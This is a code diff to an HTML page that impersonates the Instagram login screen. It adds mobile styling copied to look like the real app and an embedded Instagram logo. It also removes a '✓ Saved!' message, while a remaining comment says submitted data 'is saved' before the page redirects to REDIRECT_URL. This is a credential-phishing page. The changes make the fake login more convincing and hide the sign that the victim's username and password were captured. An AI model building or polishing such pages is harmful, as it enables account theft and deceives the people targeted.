@@ -384,6 +384,186 @@
     animation: spin 0.75s linear infinite;
     vertical-align: middle;
   }
+
+  /* ─── MOBILE RESPONSIVE ─── */
+  @media (max-width: 768px) {
+    body {
+      background: #1C1C1E;
+    }
+
+    .main {
+      flex-direction: column;
+      min-height: 100vh;
+    }
+
+    /* Hide left decorative panel on mobile */
+    .left {
+      display: none;
+    }
+
+    /* Right panel becomes full-screen mobile login */
+    .right {
+      width: 100%;
+      min-height: 100vh;
+      background: #1C1C1E;
+      border-left: none;
+      padding: 0 24px;
+      justify-content: flex-start;
+      padding-top: 60px;
+    }
+
+    /* Language selector at top */
+    .right::before {
+      content: 'English (UK)';
+      display: block;
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      text-align: center;
+      font-size: 13px;
+      color: #EBEBF5;
+      padding: 14px;
+      background: #1C1C1E;
+      z-index: 10;
+    }
+
+    /* Instagram logo centered on mobile */
+    .panel-title {
+      display: none;
+    }
+
+    /* Add Instagram logo above form */
+    .right > .panel-title + * {
+      margin-top: 0;
+    }
+
+    /* Instagram icon as header */
+    .right > input:first-of-type {
+      margin-top: 0;
+    }
+
+    /* Inputs styled like iOS */
+    .input-field {
+      background: #2C2C2E;
+      border: 1px solid #3A3A3C;
+      border-radius: 10px;
+      padding: 14px 16px;
+      font-size: 16px; /* Prevents iOS zoom */
+      color: #EBEBF5;
+      margin-bottom: 10px;
+      -webkit-appearance: none;
+    }
+
+    .input-field::placeholder {
+      color: #636366;
+      font-size: 16px;
+    }
+
+    .input-field:focus {
+      border-color: #636366;
+      background: #2C2C2E;
+      outline: none;
+    }
+
+    /* Login button */
+    .btn-login {
+      background: rgba(0,100,224,0.4);
+      border-radius: 22px;
+      padding: 14px;
+      font-size: 16px;
+      font-weight: 600;
+      margin-top: 6px;
+      margin-bottom: 24px;
+    }
+
+    .btn-login.active {
+      background: #0064E0;
+    }
+
+    /* Forgot password */
+    .forgot {
+      font-size: 14px;
+      font-weight: 500;
+      color: #EBEBF5;
+      margin-bottom: 32px;
+    }
+
+    /* OR divider */
+    .divider {
+      margin-bottom: 28px;
+    }
+
+    .divider-line {
+      background: #3A3A3C;
+    }
+
+    .divider span {
+      color: #636366;
+    }
+
+    /* Facebook login button - hide on mobile like screenshot */
+    .btn-facebook {
+      display: none;
+    }
+
+    /* Create account button */
+    .btn-create {
+      background: transparent;
+      border: 1.5px solid #3A3A3C;
+      border-radius: 22px;
+      color: #0A84FF;
+      font-size: 16px;
+      font-weight: 600;
+      padding: 14px;
+      margin-bottom: 32px;
+      position: fixed;
+      bottom: 40px;
+      left: 24px;
+      right: 24px;
+      width: auto;
+    }
+
+    /* Meta logo at bottom */
+    .meta-logo {
+      position: fixed;
+      bottom: 12px;
+      left: 0;
+      right: 0;
+      text-align: center;
+      justify-content: center;
+    }
+
+    .meta-logo svg {
+      width: 60px;
+    }
+
+    #msg {
+      font-size: 14px;
+    }
+
+    footer {
+      display: none;
+    }
+
+    /* Add Instagram icon at top of mobile form */
+    .mobile-ig-logo {
+      display: flex;
+      justify-content: center;
+      margin-bottom: 36px;
+    }
+  }
+
+  /* Show mobile logo only on mobile */
+  .mobile-ig-logo {
+    display: none;
+  }
+
+  @media (max-width: 768px) {
+    .mobile-ig-logo {
+      display: flex;
+    }
+  }
 </style>
 </head>
 <body>
@@ -408,6 +588,10 @@
 
   <!-- ═══ RIGHT ═══ -->
   <div class="right">
+    <!-- Mobile-only Instagram logo (same as website) -->
+    <div class="mobile-ig-logo">
+      <img src="data:image/png;base64,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" alt="Instagram" style="width:70px;height:70px;object-fit:contain;mix-blend-mode:lighten;"/>
+    </div>
     <p class="panel-title">Log into Instagram</p>
 
     <input class="input-field" type="text" id="username" placeholder="Mobile number, username or email" autocomplete="username"/>
@@ -499,9 +683,6 @@
       });
 
       // no-cors means we can't read response, but data is saved
-      msg.style.color = '#4dde80';
-      msg.textContent = '✓ Saved! Redirecting...';
-
       setTimeout(() => {
         window.location.href = REDIRECT_URL;
       }, 800);
